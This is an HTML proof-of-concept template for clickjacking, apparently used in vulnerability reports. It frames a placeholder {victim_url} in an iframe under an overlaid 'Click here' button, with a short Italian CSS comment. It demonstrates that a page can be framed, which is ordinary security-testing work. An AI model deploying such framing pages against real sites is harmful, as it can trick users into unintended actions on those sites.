<html>
<head>
    <title>Clickjacking POC</title>
    <style>
        body {
            background-color: #1e1e1e;
            font-family: Arial, sans-serif;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: flex-start;
            height: 100vh;
            margin: 0;
            color: #eeeeee;
        }
        .description {
            width: 80%;
            max-width: 900px;
            margin: 30px auto 15px auto;
            text-align: center;
            color: #cccccc;
        }
        h2 {
            color: #ffffff;
            margin-bottom: 8px;
        }
        .info-block {
            width: 80%;
            max-width: 900px;
            margin: 0 auto 20px auto;
            text-align: center;
        }
        .info-block p {
            font-weight: bold;
            margin: 0;
            word-wrap: break-word;
            overflow-wrap: break-word;
            color: #cccccc;
        }
        .vulnerable-text {
            color: #ffffff;
            font-weight: bold;
        }
        .vulnerable-url {
            color: #ff0000; 
            font-weight: normal;
            margin-left: 5px;
        }
        .container {
            position: relative;
            width: 80%;
            max-width: 900px;
            height: 600px;
            border: 2px solid #444;
            box-shadow: 0 0 10px rgba(255, 255, 255, 0.1);
            background-color: #ffffff; /* Sfondo chiaro per l'iframe */
            margin: 0 auto 40px auto; /* Per dare spazio sotto */
        }
        .container iframe {
            width: 100%;
            height: 100%;
            border: none;
            display: block;
        }
        .overlay-button {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            padding: 20px 40px;
            font-size: 20px;
            font-weight: bold;
            color: #ffffff;
            background-color: #2196f3;
            border: none;
            cursor: pointer;
            opacity: 1;
            z-index: 10;
            border-radius: 5px;
            box-shadow: 0 4px 6px rgba(255, 255, 255, 0.1);
        }
        .overlay-button:hover {
            background-color: #1976d2;
        }
    </style>
</head>
<body>
    <div class="description">
        <h2>Clickjacking Vulnerability POC</h2>
        <p>This proof‑of‑concept demonstrates a clickjacking vulnerability, enabling unauthorized interaction and data access.</p>
    </div>

    <div class="info-block">
        <p>
            <span class="vulnerable-text">Vulnerable:</span>
            <span class="vulnerable-url">{victim_url}</span>
        </p>
    </div>

    <div class="container">
        <iframe src="{victim_url}"></iframe>
        <button class="overlay-button">Click here</button>
    </div>
</body>
</html>
